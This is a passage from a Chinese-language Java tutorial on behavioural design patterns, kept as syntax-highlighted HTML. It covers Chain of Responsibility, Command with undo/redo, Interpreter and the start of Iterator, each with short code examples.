&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CEOHandler&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 处理请求:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Request&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;123.45&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Request&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Alice&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1234.56&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Request&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bill&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;12345.67&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Request&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;John&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;123456.78&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>责任链模式本身很容易理解，需要注意的是，&lt;code>Handler&lt;/code>添加的顺序很重要，如果顺序不对，处理的结果可能就不是符合要求的。&lt;/p>
&lt;p>此外，责任链模式有很多变种。有些责任链的实现方式是通过某个&lt;code>Handler&lt;/code>手动调用下一个&lt;code>Handler&lt;/code>来传递&lt;code>Request&lt;/code>，例如：&lt;/p>
&lt;pre tabindex="0">&lt;code>public class AHandler implements Handler {
private Handler next;
public void process(Request request) {
if (!canProcess(request)) {
// 手动交给下一个Handler处理:
next.process(request);
} else {
...
}
}
}
&lt;/code>&lt;/pre>&lt;p>还有一些责任链模式，每个&lt;code>Handler&lt;/code>都有机会处理&lt;code>Request&lt;/code>，通常这种责任链被称为拦截器（Interceptor）或者过滤器（Filter），它的目的不是找到某个&lt;code>Handler&lt;/code>处理掉&lt;code>Request&lt;/code>，而是每个&lt;code>Handler&lt;/code>都做一些工作，比如：&lt;/p>
&lt;ul>
&lt;li>记录日志；&lt;/li>
&lt;li>检查权限；&lt;/li>
&lt;li>准备相关资源；&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>例如，JavaEE的Servlet规范定义的&lt;code>Filter&lt;/code>就是一种责任链模式，它不但允许每个&lt;code>Filter&lt;/code>都有机会处理请求，还允许每个&lt;code>Filter&lt;/code>决定是否将请求“放行”给下一个&lt;code>Filter&lt;/code>：&lt;/p>
&lt;pre tabindex="0">&lt;code>public class AuditFilter implements Filter {
public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
log(req);
if (check(req)) {
// 放行:
chain.doFilter(req, resp);
} else {
// 拒绝:
sendError(resp);
}
}
}
&lt;/code>&lt;/pre>&lt;p>这种模式不但允许一个&lt;code>Filter&lt;/code>自行决定处理&lt;code>ServletRequest&lt;/code>和&lt;code>ServletResponse&lt;/code>，还可以“伪造”&lt;code>ServletRequest&lt;/code>和&lt;code>ServletResponse&lt;/code>以便让下一个&lt;code>Filter&lt;/code>处理，能实现非常复杂的功能。&lt;/p>
&lt;h3 id="命令command">命令Command&lt;/h3>
&lt;p>把请求封装成一个命令，然后执行该命令&lt;/p>
&lt;p>在使用命令模式前，我们先以一个编辑器为例子，看看如何实现简单的编辑操作（用一个&lt;code>StringBuilder&lt;/code>模拟一个文本编辑器，它支持&lt;code>copy()&lt;/code>、&lt;code>paste()&lt;/code>、&lt;code>add()&lt;/code>、&lt;code>delete()&lt;/code>等方法）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TextEditor&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">copy&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">paste&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getFromClipBoard&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">delete&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">deleteCharAt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getState&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>正常情况，我们像这样调用&lt;code>TextEditor&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">TextEditor&lt;/span> &lt;span style="color:#111">editor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TextEditor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Command pattern in text editor.\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">copy&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">paste&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getState&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是直接调用方法，调用方需要了解&lt;code>TextEditor&lt;/code>的所有接口信息。&lt;/p>
&lt;p>如果改用命令模式，我们就要把调用方发送命令和执行方执行命令分开。怎么分？&lt;/p>
&lt;p>解决方案是引入一个&lt;code>Command&lt;/code>接口：&lt;/p>
&lt;pre tabindex="0">&lt;code>public interface Command {
void execute();
}
&lt;/code>&lt;/pre>&lt;p>调用方创建一个对应的&lt;code>Command&lt;/code>，然后执行，并不关心内部是如何具体执行的。&lt;/p>
&lt;p>为了支持&lt;code>CopyCommand&lt;/code>和&lt;code>PasteCommand&lt;/code>这两个命令，我们从&lt;code>Command&lt;/code>接口派生：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CopyCommand&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Command&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 持有执行者对象:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">TextEditor&lt;/span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">CopyCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TextEditor&lt;/span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receiver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">copy&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PasteCommand&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Command&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">TextEditor&lt;/span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">PasteCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TextEditor&lt;/span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receiver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">receiver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">paste&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后我们把&lt;code>Command&lt;/code>和&lt;code>TextEditor&lt;/code>组装一下，客户端这么写：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">TextEditor&lt;/span> &lt;span style="color:#111">editor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TextEditor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Command pattern in text editor.\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 执行一个CopyCommand:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Command&lt;/span> &lt;span style="color:#111">copy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CopyCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">copy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;----\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 执行一个PasteCommand:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Command&lt;/span> &lt;span style="color:#111">paste&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PasteCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">paste&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">editor&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getState&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这就是命令模式的结构：&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903142302481.png" alt="image-20220903142302481">&lt;/p>
&lt;p>虽然看起来比直接调用复杂的多，但如果TextEditor复杂到一定程度，并且需要支持Undo、Redo的功能时，就需要使用命令模式，因为我们可以给每个命令增加&lt;code>undo()&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Command&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">undo&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后把执行的一系列命令用&lt;code>List&lt;/code>保存起来，就既能支持Undo，又能支持Redo。这个时候，我们又需要一个&lt;code>Invoker&lt;/code>对象，负责执行命令并保存历史命令：&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903142424888.png" alt="image-20220903142424888">&lt;/p>
&lt;h3 id="解释器interpreter">解释器Interpreter&lt;/h3>
&lt;p>是一种针对特定问题设计的一种解决方案&lt;/p>
&lt;p>举例：匹配字符串的时候，由于匹配条件非常灵活，使得通过代码来实现非常不灵活，针对以下的匹配条件：&lt;/p>
&lt;ul>
&lt;li>以&lt;code>+&lt;/code>开头的数字表示的区号和电话号码，如&lt;code>+861012345678&lt;/code>；&lt;/li>
&lt;li>以英文开头，后接英文和数字，并以.分隔的域名，如&lt;code>www.liaoxuefeng.com&lt;/code>；&lt;/li>
&lt;li>以&lt;code>/&lt;/code>开头的文件路径，如&lt;code>/path/to/file.txt&lt;/code>；&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>因此，需要一种通用的表示方法——正则表达式来进行匹配。正则表达式就是一个字符串，但要把正则表达式解析为语法树，然后再匹配指定的字符串，就需要一个解释器。&lt;/p>
&lt;p>实现一个完整的正则表达式的解释器非常复杂，但是使用解释器模式却很简单：&lt;/p>
&lt;pre tabindex="0">&lt;code>String s = &amp;#34;+861012345678&amp;#34;;
System.out.println(s.matches(&amp;#34;^\\+\\d+$&amp;#34;));
&lt;/code>&lt;/pre>&lt;p>类似的，当我们使用JDBC时，执行的SQL语句虽然是字符串，但最终需要数据库服务器的SQL解释器来把SQL“翻译”成数据库服务器能执行的代码，这个执行引擎也非常复杂，但对于使用者来说，仅仅需要写出SQL字符串即可。&lt;/p>
&lt;h3 id="迭代器iterator">迭代器Iterator&lt;/h3>
&lt;p>提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。&lt;/p>
&lt;p>我们以&lt;code>List&lt;/code>为例，要遍历&lt;code>ArrayList&lt;/code>，即使我们知道它的内部存储了一个&lt;code>Object[]&lt;/code>数组，也不应该直接使用数组索引去遍历，因为这样需要了解集合内部的存储结构。如果使用&lt;code>Iterator&lt;/code>遍历，那么，&lt;code>ArrayList&lt;/code>和&lt;code>LinkedList&lt;/code>都可以以一种统一的接口来遍历：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Iterator&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">it&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">iterator&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#111">it&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">it&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>实际上，因为Iterator模式十分有用，因此，Java允许我们直接把任何支持&lt;code>Iterator&lt;/code>的集合对象用&lt;code>foreach&lt;/code>循环写出来：&lt;/p>
